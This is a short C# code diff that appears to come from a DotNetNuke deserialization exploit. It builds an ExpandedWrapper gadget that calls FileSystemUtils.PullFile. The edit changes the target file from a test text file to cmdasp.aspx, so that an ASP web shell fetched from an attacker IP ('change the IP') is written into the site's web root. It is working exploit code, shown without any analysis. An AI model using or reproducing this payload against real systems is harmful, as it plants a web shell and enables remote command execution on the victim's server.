@@ -20,7 +20,7 @@ namespace ExpWrapSerializer
             myExpWrap.ProjectedProperty0.ObjectInstance = new FileSystemUtils();
             myExpWrap.ProjectedProperty0.MethodName = "PullFile";
             myExpWrap.ProjectedProperty0.MethodParameters.Add("http://192.168.45.192/cmdasp.aspx"); // change the IP 
-            myExpWrap.ProjectedProperty0.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");
+            myExpWrap.ProjectedProperty0.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/cmdasp.aspx");
 
 
             Hashtable table = new Hashtable();
